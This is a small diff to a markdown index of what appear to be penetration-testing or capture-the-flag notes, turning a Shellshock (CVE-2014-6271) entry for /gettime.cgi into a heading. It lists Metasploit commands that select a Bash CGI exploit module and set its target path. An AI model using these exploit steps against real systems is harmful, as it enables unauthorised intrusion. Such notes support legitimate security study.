@@ -206,11 +206,7 @@ __Start netcat__
 - [x] [Content-Security-Policy](csp.md)
 
 
-
-
-# Web
-
-/gettime.cgi Bash CVE-2014-6271 Vulnerability (Shellshock)
+##  `/gettime.cgi` Bash CVE-2014-6271 Vulnerability (Shellshock)
   - __`use exploit/multi/http/apache_mod_cgi_bash_env_exec`__
     - __`set TARGETURI /gettime.cig`__
   - [Shellshock](/Cgi/Shellshock.md)
